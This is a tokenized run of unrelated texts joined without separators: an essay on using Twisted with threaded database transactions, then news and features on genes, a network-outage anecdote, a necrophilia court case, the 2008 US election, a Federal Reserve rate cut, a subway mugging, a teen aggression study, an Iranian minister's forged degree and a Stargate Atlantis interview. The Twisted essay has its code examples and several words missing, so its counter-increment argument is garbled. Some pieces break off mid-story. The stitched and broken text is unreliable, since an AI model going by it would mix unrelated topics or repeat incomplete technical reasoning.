I think that concurrency is a difficult problem that affects every aspect of your code , and so it is important to have a comprehensive , consistent , and easy to understand plan to deal with it in any given system .
Twisted 's " cooperatively multitasking / callbacks - scheduled - by - I/ O- and - timers " idiom is one concurrency model .
Deferreds are a super important convenience mechanism in that model , but they 're not completely necessary ; you can do this with just dataReceived , connectionLost , callLater etc .
In general this model - let 's call it something memorable , like " CM / CSBIOAT " - is a pretty easy concurrency model to work with once you know how it works .
In particular , it 's pretty easy to avoid making a common variety of serious concurrency mistakes , since you do n't need to remember to declare any locks , and the behavior of the system under load is unsurprising , if not necessarily ideal for performance .
Threading is another concurrency model with which we are all familiar .
Shared - state multithreading is a pretty bad concurrency model for general use .
In particular , it 's very easy to make mistakes that are impossible to diagnose or reproduce .
Despite its unsuitability for applications , threading can be a useful building - block as a low - level tool to construct higher - level concurrency models .
In many practical cases I am aware of , threading is theavailable building - block at this level for building efficient implementations of other concurrency models , because operating systems and compilers do n't provide anything better .
There is an antipattern that arises from a somewhat naive understanding of these two models .
The Twisted novitiate discovers that Twisted Is Good , and Threads Are Bad .
Experimentally they discover that this is indeed true , and that despite its eccentricities , writing and debugging " Twisted " code ( whose benefits really come from the CM / CSBIOAT pattern ) is a lot easier than writing and debugging threaded code .
So , our unfortunate Twisted novice now needs to write aapplication : what to do ?
Well , one way they can write it is to " just use threads " for data - access logic and communicate with Twisted some other how - for example , to put all their database logic in a function they pass to .
The only other apparent option is to " use Deferreds " and invokeor .
Deferreds are Twisted - Good !
Threads are ... threads !
Bad !
The answer seems obvious .
However , in choosing to use this facility , you 've done far more than choosing between " twisted " and " threads " .
If you use , you can easily keep all of your work in a single transaction ; since database APIs are blocking , you can only safely do a read followed by a write in the same transaction if you can block between those calls .
If you do a , take the result of that and pass it as input to a , you 're sharing data between two different transactions and potentially two different cursors .
Whether Deferreds or good or not , this breaks the assumptions that the underlying database uses to keep its data consistent .
Consider incrementing a counter .
In the " threaded " case , you 'd do something like this :
This always results in foo .
thingy being set to .
If your database is set up properly ( and most are by default ) there 's no opportunity for other code to execute between those two statements .
But in the " twisted " case you do something like this :
As syntactically pleasant as thatto be , and as convenient as it might seem to be able to call Twisted APIs as much as you want in the middle of this work , any amount of code can run between the first line and the second , thanks to those pesky ' yield's .
That means if you run ' stuff ' twice , there 's a good chance that your callbacks will stomp on each other and one of the increments will be lost .
Transactional relational database access is a really different concurrency model , all its own .
In many cases it appears to be the same as plain old shared - state multithreading ; not least of which because it is implemented using threads and the threads are completely exposed to application code , and made part of the database interface 's API .
However , using a transactional database to store your interesting state is much , much safer than just using threads to access any old datastructure .
An ACID database is specifically implemented to provide a consistent view of your data to any executing client at any time , and in the cases where that would be impossible , to schedule execution of various clients to provide an ordering where data is consistent .
( You 'll notice that I have avoided saying " thread " , but in practice an executing SQL client is a thread in your application . )
Caching middleware confuses this issue , making it more like regular multithreading ; but in a good SQL database , using threads rather than just separate processes is just an optimization ; one which should be completely transparent to your application code .
Axiom does n't really have a concurrency model ( it ought to , but that 's a discussion for another day ) .
The idea there is that , like the rest of Twisted , you try hard never to block for too long .
It is possible — too easy , really — to screw this up and block for a long time waiting for the disk in an Axiom program , but to some extent that 's true of any Python code .
Since Axiom is typically accessed by one , or at most two processes at a time , you wo n't end up blocking on your database for a long time because some other code is using it ; the main thing Twisted 's concurrency model is designed to prevent is your code blocking and getting stuck or being idle , not your code blocking at all .
So , I 'm going to give you advice for using Storm or ADBAPI : the only advice for Axiom is " write fast queries " .
Assuming that you 're writing a traditional database application , here 's my advice for you .
Let 's assume that Storm ( or ADBAPI ) does not have any thread - safety bugs itself .
This assumption is unlikely to betrue , but you probably have to make it regardless if you 're going to use either of these things at all , regardless of my advice :) .
With that assumption , you can use Storm ( or ADBAPI ) with Twisted from a thread - pool and pretend , in your application , that the threads do not exist .
You should avoid accessing global state and pretend that your code might be run in a subprocess or a thread or even on a different computer .
If you 're lucky , one day it will be , and your application will " magically " scale !
If you follow this simple discipline , you can cleanly interface between the Twisted concurrency model ( where you do all of your non-database I/O ) and the RDBMS concurrency model ( where you interact with all of your " data " objects ) .
Do n't touch any database objects in your Twisted mainloop .
Do n't touch any Twisted objects in your database transactions .
This has the added benefit of not needing to worry that you 're sending out information about partially - completed database operations to a network connection , or injecting potentially transient network state into a persistent database operation that may need to be re-tried .
In theory , there 's nothing stopping an asynchronous data - access API from doing all of the same stuff that I just described threads doing .
All you 'd need is good non-blocking database infrastructure , non-blocking transactions , and a bunch of code to associate a running transaction object with a particular database transaction and cursor .
It is possible , if you go down to the database - protocol level , to write a database wrapper which actually integrated with the Twisted concurrency model and treated your database as just another source of input and output .
In terms of preventing errors and assisting making code testable and deterministic , I think this would be an improvement over the threaded version of this solution .
However , implementing such an improvement would likely take quite a bit of time .
Time that most small database - backed projects do n't have , so it 's unlikely someone will need to scratch this particular itch any time soon .
Even if someone did do all that work for one database , it 's likely that a lot of it would need to be done over again for each subsequent set of database bindings ; so , using a DB - API module in a thread would remain the only way to retain database portability .
For the moment , threads and threadpools are the tools that existing database bindings give us to manage transactions , and it 's likely that they 're adequate for a huge majority of applications .
The only real problem is that you can't completely hide threads from the application and make sure they 're not being used for evil .
Over the summer , Sonja Prohaska decided to try an experiment .
She would spend a day without ever saying the word “ gene . ” Dr. Prohaska is a bioinformatician at the University of Leipzig in Germany .
In other words , she spends most of her time gathering , organizing and analyzing information about genes .
“ It was like having someone tie your hand behind your back , ” she said .
But Dr. Prohaska decided this awkward experiment was worth the trouble , because new large - scale studies of DNA are causing her and many of her colleagues to rethink the very nature of genes .
They no longer conceive of a typical gene as a single chunk of DNA encoding a single protein .
“ It can not work that way , ” Dr. Prohaska said .
There are simply too many exceptions to the conventional rules for genes .
It turns out , for example , that several different proteins may be produced from a single stretch of DNA .
Most of the molecules produced from DNA may not even be proteins , but another chemical known as RNA .
The familiar double helix of DNA no longer has a monopoly on heredity .
Other molecules clinging to DNA can produce striking differences between two organisms with the same genes .
And those molecules can be inherited along with DNA .
The gene , in other words , is in an identity crisis .
This crisis comes on the eve of the gene ’s 100th birthday .
The word was coined by the Danish geneticist Wilhelm Johanssen in 1909 , to describe whatever it was that parents passed down to their offspring so that they developed the same traits .
Johanssen , like other biologists of his generation , had no idea what that invisible factor was .
But he thought it would be useful to have a way to describe it .

" Alright !
11:02 a.m... Another five bucks for me ! "
Once again , Ricky Fine had hit it big in the network technician over / under betting pool for predicting the time of the daily network outage .
It occurred around 11 am , every day , but not precisely .
The network would pulse on and off around 60 cycles per minute , but again , not exactly .
" Any results from the packet sniffer ? " asked another technician .
" Nothing , not even so much as a stutter , " replied Ricky , " You 'd think for as much money as this thing costs , we'd get a hint as to what 's going on . "
The technician sighed , " Well , we 'll just try again tomorrow .
What do you say ?
Next one 's going to be before 11 a .m. ? "
" Definitely .
We 're due for an ' under ' this time around , " agreed Ricky .
Days passed and with their tools failing them , Ricky and his fellow technicians finally had to resort to brute strength analysis .
This meant disconnecting different network segments every day and was by no means an easy task .
The Hardware
The thing about the hardware that Ricky and his co-workers supported was that it came from an era before CAT5 and fiber optics .
Their ethernet was a swarm of coax cabling and BNC connectors , usually run haphazardly through buildings that were never designed for it .
Also , as if to add insult to injury , the company exclusively used hubs for their internal network .
There ’s a good reason why hubs have since been relegated as relics : unlike switches , which intelligently route packets to the appropriate destination , hubs simply repeat all packets from all connected devices to all of the other connected devices .
This , along with wiring factors made the outage develop into a riddle , wrapped up in an enigma , encased within a rats ’ nest of cabling .
Brute Force Pays Off
Finally , one day , they located the problem segment as the network was going down - the fifth floor .
They checked every bit of cable on the line , working through the night testing impendence , frays , an even going so far as to swap out every network card on all of the PCs on the floor .
Having done everything in their power , Ricky and his crew felt confident that the problem was solved .
No such luck .
The next day , 11 a.m. rolled around and a couple of minutes later , there was the regular outage .
Like a pack of bloodhounds , the technicians fanned out to every cable run connected to the floor 's hub .
Ricky was under a cubicle desk looking for the cable run when he heard , " Thump , thump , thump ... " coming from the other side of the cubicle wall .
It was about every second , but not exactly .
When he emerged and peeked around the corner , he was met with the department 's resident coffee expert .
He could extol the virtues or curses of every kind of coffee made and every roaster in the area .
And as it happened , he had just returned from percolating his morning dose .
Carefully observing the coffee connoisseur , Ricky watched him take a large sip of coffee , set his foot on the BNC connector , and nervously roll it back and forth a few times .
A few second later , he'd take another sip and tap the connector again .
It did n't take too long for Ricky to realize that , every day , he'd get hopped up on java , direct his nervousness at his work and absently roll the BNC connector like others would drum their fingers .
The outage would provide enough of a break that he'd calm down a bit and leave that innocent connector alone for the rest of the day .
Ricky went ahead and moved the BNC connector out of the line of fire and the next day , no problems .
The Aftermath
After the smoke cleared and business got back to normal , the final cost of the outage was calculated , and the executives were furious .
From the rented network sniffer to the hours of productivity and data lost during the outage , someone was going to have to answer how they could be so naive as to not be able to find that the problem was caused by the nervous gyrations of the local caffeine junkie .
Ricky 's group did their best to emphasize that their infrastructure was at fault rather than the competence of the technicians .
The execs scoffed at their explanation but , when the cost of new cable runs and upgraded network equipment was compared to the cost of the outage , they relented and agreed to upgrade the infrastructure .
After all , there were a lot of coffee drinkers in the company .
Three men accused of trying to dig up a grave in Wisconsin in order to have sex with a dead woman entered not guilty pleas this week .
The twin brothers , Alex and Nicholas Grunke , and Dustin Radke ( all pictured ) are alleged to have attempted to remove the body of a 20 year - old woman killed a week previously in a motorcycle crash .
The three decided on the woman after seeing her photo in an obituary in the local newspaper .
Stranger still perhaps is the legal argument leading to the point .
The case in the courts so far has n’t been whether the three were guilty or not , but whether necrophilia was illegal in Wisconsin or not .
A lower court originally found that there was nothing in the state that banned the boys having their way with the corpse , but the State Supreme Court over - ruled that decision in July .
The fact that the three brought condoms to the scene to protect themselves was not taken into account by the court .

Joe Biden teamed up with the Clintons on Sunday for a rally in his hometown of Scranton , Pennsylvania .
Former President Bill Clinton and Sen. Hillary Clinton explained to voters why they think Barack Obama 's Democratic ticket is the best choice for middle - class families .
" You know because Joe Biden is from here that he understands middle - class economics with middle - class values , " the former president said .
Clinton told voters that Biden understands their lives , and that out of all of the people in Congress , he is one of the members who knows " the most about the economic , political and security challenges of America . "

Clinton won the Pennsylvania primary in April , beating Obama 55 to 45 percent .
The New York senator blasted the Republicans as she made her case for Obama and Biden .
" To John McCain and George Bush , the middle class is n't fundamental ; it 's ornamental .
They do n't understand that we are at the core of whether this country goes up or down , " she said .

" Barack Obama and Joe Biden will be leaders who will lead us out of this economic crisis . "
Biden rallied the crowd as he pounded the podium and called for voters to " get up . "
" I have never seen as many Americans knocked down as I have in the last past eight years .
It 's time to ... get up , " he said .
" So get up Pennsylvania , get up Scranton , get up deliver and this election for Barack Obama . "
On the Republican side , John McCain staged an impromptu pep rally at his campaign headquarters in Arlington , Virginia , and vowed to defeat Barack Obama in the final presidential debate this week .
" After I whip his you - know - what in this debate , we 're going to be going out 24/ 7 " in battleground states , McCain said .
His running mate , Gov. Sarah Palin , campaigned in St. Clairsville , Ohio , on Sunday .
" All across America , I know that there 's a lot of anger right now , " Palin said .
" There 's anger about the insider dealing of lobbyists .
And anger at the greed of Wall Street .
And anger about the arrogance of the Washington elite . "
" We need serious reforms to change Washington .
John McCain is going to turn your anger into action , " Palin said .
New polls suggest McCain is gaining slightly on Obama in Ohio .
Obama leads by 3 percentage points ( 49 to 46 percent ) , according to CNN 's most recent Ohio poll of polls -- down 1 percentage point from his lead in the previous poll of polls for the state .
Five percent of the state 's voters are undecided , according to the polls .
The network 's last Ohio poll of polls , released October 9 , showed Obama leading McCain by 4 points , 50 to 46 percent .
In the September 21 poll of polls , Obama led McCain by a single point , 47 to 46 percent .
McCain and Obama both took time off the campaign trail Sunday to prepare for their final presidential debate on Wednesday .
McCain worked on his preps in the Washington area , acknowledging to supporters in Arlington that his campaign is " a couple points down " in national polls .
In CNN 's national poll of polls , Obama was leading McCain by 8 points on Sunday .
" But we 're right in this game .
The economy has hurt us a little bit in the last week or two , but in the last few days we 've seen it come back up because they want experience , and they want knowledge and they want vision .
And we 'll give that to America , " he said .
" And I know that we 're going to win this race . "
Obama on Sunday was at home in Chicago , Illinois .
Later in the day , he traveled to Ohio to get ready for the debate , and made some door - to - door visits with prospective voters near Toledo , Ohio .
The final presidential debate takes place at Hofstra University in Hempstead , New York .
The debate follows days of heated rhetoric on the campaign trail .

Both sides have played the association game , with McCain 's campaign emphasizing Obama 's political relationship with Bill Ayers , a founding member of the radical Weather Underground , and the Obama campaign highlighting McCain 's role in the Keating Five scandal .
Civil rights icon and Georgia Rep. John Lewis sparked controversy on Saturday when he compared the feeling at recent Republican rallies to those of segregationist George Wallace .
The McCain campaign called his remarks a " brazen and baseless attack , " and called on Obama to repudiate the comments .
Lewis later said he did not compare McCain and Palin to Wallace , but was trying to remind " Americans that toxic language can lead to destructive behavior . "
Obama said he appreciates McCain 's recent efforts to tone down the rhetoric at some of his rallies .

All About U.S. Presidential Election
NEW YORK ( CNNMoney.com ) --
In its latest effort to try and stimulate the U.S. economy , the Federal Reserve cut its key interest rate to a range of between zero percent and 0.25 % , and said it expects to keep rates near that unprecedented low level for some time to come .
The central bank typically sets a specific target for its federal funds rate instead of a range .
The rate had previously been at 1 % and this marks the first time the Fed has cut rates below 1 % .
Most investors were expecting the Fed to cut rates to either 0.25 % or 0.5 % .
The federal funds rate is an overnight lending rate used as a benchmark to set rates for a variety of loans , including adjustable rate mortgages , credit cards , home equity lines of credit and business loans .
This marks the tenth time it has cut rates in the last 15 months .
Several banks announced they were lowering their prime rate to 3.25 % in light of the Fed 's decision .
Typically , the prime rate is 3 percentage points higher than the fed funds rate .
It was 4 % before Tuesday 's rate cut .
Despite the dramatic nature of the Fed 's move , some economists questioned whether it will have much effect on the economy .
They said the problem for consumers and businesses right now is not the cost of borrowing , but the availability of credit and the weaker economic fundamentals .
" Lowering rates to this level is purely a psychological move made to send the message that the Fed is committed to righting the sinking economic ship , " said Rich Yamarone , director of economic research at Argus Research .
He noted the previous rate cuts did little to stop home and auto sales from plunging .
Running out of arrows
There are some concerns that taking the fed funds rate so close to zero leaves the Fed with little room for additional moves if the economy does not start to show signs of improvement soon .
But the Fed said in a statement that it is looking at different steps it can take to stimulate the economy and keep market rates low , including the purchases of long - term U.S. Treasury notes .
The Fed also said it will consider other , yet to be disclosed moves as well .
" The Federal Reserve will continue to consider ways of using its balance sheet to further support credit markets and economic activity , " the Fed said .
A senior Fed official who briefed reporters after the announcement said the Fed set a range for the rate rather than give a specific number as an acknowledgement that it has trouble precisely controlling the rate at a time when rates are this low .
The effective rate , which is based on market trades of Treasurys and excess reserve balances between banks on a daily basis , has been regularly slipping below the Fed 's stated rate for a couple of months now .
Asked why the Fed did n't go ahead and the cut the rate to 0 % , the Fed official said keeping the rate a little above zero would make the credit markets run more smoothly .
John Silvia , chief economist at Wachovia , said he thinks the said it is possible that the effective fed funds rate could even fall below zero on occasion and the Fed can " live with that " because the central bank is " going to do whatever it takes " to prevent the economy from deteriorating further .
Kevin Giddis , managing director of fixed income at Morgan Keegan , said he was surprised by the move .
Like many investors , he had expected that the Fed would only cut the rate to 0.5 % .
" I did n't think they would be this aggressive .
I thought they 'd keep something left in the quiver , " he said .
Worries about deflation
In explaining the reason behind the rate cut , the Fed said the U.S. economy , which has officially been in a recession for a year , was in danger of getting weaker , and that the risk of inflation had decreased " appreciably . "
Earlier Tuesday , the Labor Department reported that the Consumer Price Index , its key inflation measure , fell by a record 1.7 % in November .
In fact , some economists are growing more worried about deflation .
One economist pointed out that there was a notable change between Tuesday 's statement and the one it issued when it last cut rates in October that suggested to him the Fed is concerned about deflation , the phenomenon of drastically lower prices that can hurt the economy .
In October , the Fed said it expected inflation would drop " to levels consistent with price stability . "
On Tuesday , those five words were not in the statement and the Fed just said it expects inflation to " moderate further . "
" To me , they 're looking at deflation now , " said Jeoff Hall , the chief U.S. economist for Thomson Reuters - IFR Markets .
" There 's no looking back at inflation . "
The senior Fed official said , however , that deflation is not a major concern of the Fed .
But the official said the Fed would continue to monitor prices and respond as necessary .
Typically , the Fed raises rates to fight inflation and lowers them to encourage spending my making borrowing more affordable .
The central bank has dual goals of promoting economic growth and price stability .
Other central banks , notably the Bank of Japan , have taken interest rates down to near the 0 % level in the past .
Last week , the Swiss central bank cut its key lending rate to 0.5 % .
NEW YORK , Nov. 19 ( UPI ) -- A 26 - year - old Guinean immigrant living in New York said she took on three muggers on the subway after they stole her purse containing her green card .
The New York Post said Wednesday after one of the muggers punched Marie Conde to allow an accomplice to steal her purse , the immigrant leaped into action to retrieve her belongings .

" I did n't know what to do , so I just started running after them , " Conde said of Sunday 's incident .
" I grabbed one of them by the arm . "
Conde said after the mugger was unable to escape her clutches , the would - be thieves apparently thought better of the crime and fled the scene without her purse .
Two men , ages 16 and 19 , were later arrested and accused of taking part in the early morning heist .
For Conde , receiving some facial bruises and placing her life in further danger was worth retrieving her green card .
" I did n't even have money in my purse , " she told the Post .
" I had my green card and papers that I did n't want to lose .
It was n't about the money , it was about the papers . "
WASHINGTON ( Reuters ) - Joe Biden and Sarah Palin agreed that climate change is real , but differed on whether human activity was its root cause in Thursday ’s U.S. vice presidential debate .

Palin , the Republican governor of Alaska , acknowledged that human activities may play a role in heating up the planet , but also said natural cycles are part of the picture .
“ I do n’t want to argue about the causes , ” she said in St. Louis .
“ What I want to argue about is , how are we going to get there to positively affect the impacts ? ”
To Biden , a Democratic senator from Delaware running with Sen. Barack Obama in the November 4 election , knowing the cause is critical to finding a cure .
“ If you do n’t understand what the cause is , it ’s virtually impossible to come up with a solution , ” Biden said .
“ We know what the cause is .
The cause is man-made .
That ’s the cause .
That ’s why the polar icecap is melting . ”
Palin ’s environmental policies have drawn criticism from green groups .
She supports drilling for oil in the Arctic National Wildlife Refuge , which her presidential running - mate , Sen. John McCain , opposes .
She said McCain favored an “ all - of - the - above ” approach to battling climate change , including the use of alternative fuels and conservation .
Biden said McCain has voted 20 times in the 15 years against funding alternative energy sources including solar , biofuels and wind power .
Obama , McCain and Biden have supported legislation to limit climate - warming carbon emissions , and on Thursday , Palin said she too favored this .
But she also linked increased domestic oil production to the fight against global warming .
“ As we rely more and more on other countries that do n’t care as much about the climate as we do , we ’re allowing them to produce and to emit and even pollute more than America would ever stand for , ” she said , when talking about reducing greenhouse gas emissions .

Scientists at the University of Chicago used brain scans to discover that aggressive youngsters might , in fact , enjoy causing pain to other people .
Researchers found that when an unusually aggressive teen watched a video of someone causing pain to another person by accident or intentionally , an area responsible for rewards highlighted in his brain .
The brain of young people , who did not show signs of aggressiveness , did not show such signals .
According to Jean Decety , Professor in Psychology and Psychiatry at the University of Chicago and an internationally recognized professional on empathy and social neuroscience , it was the first time that scientists applied fMRI scans to investigate the conditions that might incite empathy .
He said that the study could help people figure out the ways to work with violent youngsters .
The study showed that the natural empathetic impulse of some violent juveniles could be disturbed in such a way that they may show an increase in aggression .
The research and its results were published in the latest issue of Biological Psychology .
The scientific work was supported by the National Science Foundation , informs the official website of the University of Chicago .
The study involved 8 boys aged between 16 and 18 , who registered aggressive behavior disorder by starting a fight , using a weapon and / or robbing their victim .
These boys were compared to a group of teenagers who did not show any signs of aggression .
Aggressive teens watched clips that featured accidental and intentional causes of pain , including the drop of heavy bowl on ones hands and stepping on ones foot on purpose .
" The aggressive youth activated the neural circuits underpinning pain processing to the same extent , and in some cases , even more so than the control participants without conduct disorder , " said the lead researcher .
A strong turn on of the amygdala and ventral striatum ( area that reacts to feeling rewarded ) in the brain of an aggressive youngster meant that he enjoyed watching others being in pain .
The other group of boys , who did not have signs of violent behavior , had their brain activating the area the reacts for self - regulation .
A similar study was conducted on children aged between 7 and 12 , who watched cartoons that featured accidental and intentional causes of pain .
When children saw someone get hurt by accident , their brain reported signals in the same area that lighted up when children were hurt or when they saw someone get hurt .
When they watched someone get hurt on purpose , their brain showed signals in the area that is associated with moral reasoning .

Kordan has become a figure of fun for presenting crudely faked credentials Iran 's parliament has voted to sack Interior Minister Ali Kordan after he admitted a degree he said he obtained from Oxford University was a forgery .
Mr Kordan said he had received the doctoral certificate in good faith , but it was later revealed as a crude fake .
The BBC's Jon Leyne in Tehran says the row could have serious implications for President Mahmoud Ahmadinejad .
MPs have accused the president of grave naivety for having been taken in by the lies of his minister .
It is very clear that the impeachment is legal
Ali Larijani
Speaker of parliament
MP's fake degree stokes anger Parliamentary speaker Ali Larijani said 188 MPs from a total of 247 had voted for a motion to impeach Mr Kordan .
Forty - five voted against the motion and 14 abstained .
It was the 10th change in Mr Ahmadinejad 's cabinet of 21 ministers ; under Iran 's constitution the entire cabinet has to be submitted to a new vote of confidence if half its members change .
The president said before the impeachment hearing that the proceedings were illegitimate , so it is not clear whether he will accept the vote , our correspondent says .
' Laughing stock '
Mr Kordan claims he was approached with the offer of a doctorate by the Tehran representative of an institution described as the London Oxford University .
All but one of the MPs who spoke took care to distinguish their impeachment of Kordan from criticism of Ahmadinejad Alireza , Tehran HAVE YOUR SAY
But the certificate turned out to be an obvious forgery , which was littered with misspellings .
The scandal has made the former minister a national laughing stock , with a fake resignation letter being passed round purporting to be from him , but full of misprints and crossings - out .
One MP said Mr Kordan - who worked as a university lecturer - had related invented tales to his students about his days in Oxford .
In fact he has never visited and does not even have a first degree .
The post of interior minister is crucial in organising the presidential elections which are due to be held in the middle of 2009 .

What will we do without our weekly McKay fix ?

I 'm exceedingly excited that I got to talk to the David Hewlett about the end of the 5 year run at Stargate Atlantis and hear what it 's like working with real scientists on the amazing SGA episode " Brain Storm . "
He also spilled it about kissing Jewel Staite and what 's in store for his future .
We 're quite curious about his project Star Crossed which is a behind the scenes comedy about working at a scifi show .
Hmm I wonder where he got that idea ?
There 's been so many great episode of SGA this year , some of the best people are saying
David Hewlett :
That 's just to depress the hell out of people , to know that it 's not coming back , that 's why we did it .

So out of this season what 's been your favorite so far and has it been hard knowing that it 's over ?
It 's so hard because there are some that are great for acting , and there 's others that are great for " hey I got to shoot really large guns " but " Brain Storm " was definitely one of them , Shrine was another that was just a lot of fun , um , it 's those two stand out out that they 're obviously McKay heavy .
But um I also really like the season opener as well , of season five , a really great way to get back into it and stuff , you know every episode has my favorite things in it .
Let 's talk about " Brain Storm " , easily one of the best episodes this season .
You brought in real life scientists , what was it like working with the scientists like Mr. Bill Nye ?
And finally taking your relationship with Keller gets to go to a whole new level ?

The great thing about " Brain Storm " was that as cool as Atlantis is , it 's really nice for Atlantis to get away from Atlantis .
It 's really nice to get back to Earth , I love the Earth based episodes , you get out of the silly costumes and away from all the technology , and you get to have , it feels like you 're actually doing a different show almost for a change , and the other thing , we got , you know Neil deGrasse Tyson , incredibly well known real scientists who are terrifyingly smart and actually terrifyingly good actors , so I think I 'm well out of work now .

Well I thought Bill did a great job .
So did I !
Bill Nye , so that guy truly knows everything , and I tested him .
I 'd come in every day with some new question for him that I 'd assuming he'd have no idea basically how to answer it – basically he knows everything .
Advertisement
You tested Bill Nye the Science Guy ?
Well when I say tested I mean , I 'd go " hmmm , " for example , " why when I turn my microwave on does my internet connection go down , " like there 's no way bill nye is gonna be able to answer that question .
He did .
He really is , it 's like a walking encyclopedia .
And I tell you never try to tie your shoes in front of an astrophysicist .
What happens is they 'll tell you you 're doing it wrong .
All my life I have apparently been tying my shoelaces wrong , there is a much more mathematically beautiful way of doing it , that I was shown by bill nye .
With Neil deGrasse Tyson looking on .
The other kind of thing that you get to do on " Brain Storm " that just do n't happen on a regular Stargate atlantis episode .
If you want to feel stupid , that 'd be an episode to hang around on .
I was like , you know , I 'm just an actor .
But it was good because you got to pretend that you were this huge scientist just with them , got to give them a little attitude back , so that must have been fun to give them a little flack .

Exactly , yeah it 's kinda hard to fake that in front of Neil deGrasse Tyson , so you know .
They were having so much fun and you know , and the other thing is , on the one end you 've got , you know , the science geniuses , and then you 've got the comedy geniuses of the world , like Dave Foley , I grew up with that guy , with Kids in the Hall and stuff , so it was amazing , just amazing , and he's also a nerd who knows everything , I might add .
It was a room full of nerds .
They filled the room with nerds who basically know everything .
Jewel was just rolling her eyes the entire time .
Speaking of Jewel Staite [ Dr. Keller ] you 're pretty much the romantic lead now on Atlantis ...
And how sad is that !
That I 'm the romantic lead
No I think it 's great , your character has come so far , did you ever think when you first started that McKay would end up the one who gets to kiss the girl ?

I mean , I was supposed to be the guy that stood behind Torri at a computer saying , you know , " we 've got no power ! " and that was it , basically .
When I came on that was originally my assumption of what I was supposed to be doing , and within three episodes I was running around on planets with guns and I was like " ah , kinda crazy ! "
The great thing about Atlantis is it 's never what you expect it to be , every episode was always something new for us , always something , I mean especially for McKay , I was very lucky in that I think I played a character that people like writing for , and for that reason you get like Brad Wright coming back and writing an episode , that has a lot of McKay in it , and Gero who writes these amazing , amazing McKay episodes , and that was his first time directing [ on " Brain Storm " ] on Stargate as well , he was just great , it was so great to do all that .

What was it like filming the last few episodes ?
Will we end SGA with a big bang ?
It was miserable !
It was absolutely miserable .
There 's nothing worse , we find out that we were n't coming back I guess a couple , a few weeks before the end , and it just makes it painful .
You 're in this weird situation where you know that it 's over , and you 're acting your little heart out like usual , cuz you 're used to having to keep going , but there 's a part of me that 's like , I want to go now .
Like if it 's over you do n't want to be hanging around , you want to rip the band - aid off and move on type thing , so you 're desperate to go away and do something else , and at the same time you 're dreading it being over and stuff .
I just can't imagine what it must have been like for SG1 after having been on for ten years .
Everyone was really sort of upset about it .

What can we look forward to in the finale ?
How did you guys really try to make it extra special does it wrap up the 5 years of work on SGA ?
There 's an extra special ending .
Yeah again it was so weird too , I can't help thinking there 's nothing you can do in one episode that 's gonna sum up five years .
I hope if anything out of this , I hope it sets up further adventures for Atlantis .
I think what 's nice about the episode is there 's enough unanswered stuff there .
There are still things that need to be dealt with that I hope there will be more Atlantis for people to see , in cheaper formats , TV movies or DVD movies or whatever they want to do .
But I do hope that ’s something we can look forward to
Well I know that the tv movies have n't been written yet , and they have n't casted them yet , but what would you like to see if McKay was in the tv movies ?

A really really nice wig .
Something with a lot of hair .
I have no idea .
The pleasure of doing McKay is no matter what I expect , or where I think they 're going with the character , it always changes up .
I look forward to more , I mean I always found that the episodes that were the most uncomfortable to make were always the best episodes to watch .
So you know I hope for some really uncomfortable feature film stuff coming up .
If that makes a difference .
I mean hanging him upside down , or its pouring with rain , or everyone 's miserable I think the episodes tend to be great – for some reason the camera just picks that stuff up .
" Brain Storm " was a lot of fun but it was an incredible amount of work , but a lot of fast paced stuff , shooting a lot of scenes in a very short time , which is n't easy , we shoot an episode in six days .
So it 's always a rush .
I think you know that 's just part of the , I think it picks up a little something that you can't fake in many ways , I feel like if we have absolutely no time to shoot the feature films and it 's very very painful for everyone .
I 'm sure my fellow cast members love me for that .

What 's it like working up close and personal with Jewel Staite , I mean Firefly fans everywhere are probably burning holes into you with jealousy ?
When you 're doing those scenes , everyone 's all " ooh so you 're with jewel in the back of a plane , a lot of kiss kissing " and the reality is you 're in the back of a plane that they have to turn the air conditioning off for sound , and you 've got cameras wedged in there and crew members who basically have n't showered for six or seven hours , and it is really one of the most unromantic and like technical things you could possibly have to do .
I find that love scenes are the most unsexy things to shoot .
Maybe other people have it better than this , but for me , I find them incredibly technical , and I spend the whole time basically apologizing to jewel about how sweaty I was .

But you must admit her scifi reputation is amazing from Firefly on down ?
Firefly 's actually my favorite scifi show that I 've watched , you know , we got the dvds of the entire collection , when she showed up on our show I was basically fanboy for the first , you know , most of the time .
Jewel 's just one of those actresses that you come across very rarely that are just that combination of wickedly funny , I mean like evilly funny , she 's just got a truly truly nasty sense of humor , and incredible actor , I often find myself saying " what ? " and she 's actually saying a line to me .
And she 's also , she 's just , this weird combination of really evil and really sweet , cuz she 's so easy to work with , and yet she 's also just really easy to bitch about work with , so basically every writing project I 'm working on right now , I write a part for her .

What projects are you working on right now ?
I have a sort of 30 Rock behind the scenes of a scifi show thing that I 'm working on now , called Star Crossed , originally looking at developing it as a tv pilot but I think we 're going to develop it as a film now , just to open it up for people .
Basically we had a half hour sitcom style thing .

I 'm curious about the other characters you work with , like Joe Flanigan .
Does he ever give you guff because you 've kinda filled the role as sexy lead guy role ?
Advertisement
Can I quote you on that ?
Well you do n't have the cowlick that he has .
But you got the girl , he got the hair ?
Advertisement
Joe gets the best features in television because of that hair I think .
He looks like he does n't do anything with it .
It just does that .
It would take me ten or twenty years of serious scientific work to get that kind of hair , but Joe just wakes up with it .
Him and Jason , those two guys , just way too good looking for their own good .
Certainly for my good .
I talked to Rachel actually last night [ Rachel Luttrell ] , she calls me every ten or fifteen minutes it 's really sad , and I was just saying for some reason the last season with the cast it was like a bunch of friends , just coming in and seeing friends every morning .
They knew when I was going to have a little hissy fit about something , or someone would show up with a sign saying ' Sandwich , ' when they know that my blood sugar was getting low and I was getting grumpy about something .
We generally just really got along .
They 're really people I hope that I can keep in my life .
It was really really just a lovely experience to work with these guys .
We 've talked about how much McKay has changed , but is it going to be hard for you , not being McKay , or are you looking forward to new challenges ?
I think unfortunately I 've taken on some McKayisms and I do n't think I 'll ever lose them .
Over 5 years you pick up things , hopefully not anything too unpleasant .
I just think that every character I play there are just a couple little traits that I never lose from them ...
But more than anything else I 'll just miss McKay , and I really , really enjoyed McKay , and I came into SG1 as a guest star to come in and do three days work , and seven years later , I 've put him down for hopefully not last time .
But it could be the last we see of McKay .
So its definitely a weird adjustment , but I 'm an actor .
I 'm lucky that the characters that I get tend to be interesting and a little schizophrenic .

Is there a moment that sticks out in your head as one of the best McKay line ?
Oh right now it would be Gero's , " mentally unstable like a fox .
"
If you 're going to end I like the fact that we 're ending on season 5 because it was a strong season .

I think the key is to remember that everybody has a little McKay in them and they should bring it with them on a day to day basis , god knows I do .
And thank you , it 's been definitely the highlight of my career so far .
It 's true everyone does have a little McKay in them , we 'll miss you David !
Amp'd Mobile is a new kind of cellular service , but the company 's founder scarcely thinks of himself as being in the phone business .
What he 's out to sell is wireless entertainment .
